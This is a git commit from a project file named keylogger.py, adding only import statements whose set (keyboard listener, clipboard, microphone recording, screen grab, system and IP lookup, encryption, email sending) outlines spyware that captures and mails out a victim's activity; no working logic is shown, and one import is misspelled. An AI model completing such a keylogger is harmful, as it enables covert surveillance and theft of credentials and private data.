8c3155da8cbc992cd8a8cb5efe64e3b96316e6c2
Darshna <darshna.adam@gmail.com>
2023-11-02 22:35:24 +0530

    added libraries

--- keylogger.py
+++ keylogger.py
@@ -5,3 +5,24 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
+
+import socket
+import platform
+
+import win32clipboard
+
+from pynput.keyboard import Key, Listener
+
+import time
+import os
+
+from scipy.io.wavfile import write
+import sounddevice as sd
+
+from cryptography.fernet import fernet
+
+import getpass
+from requests import get
+
+from multiprocessing import Process, freeze_support
+from PIL import ImageGrab
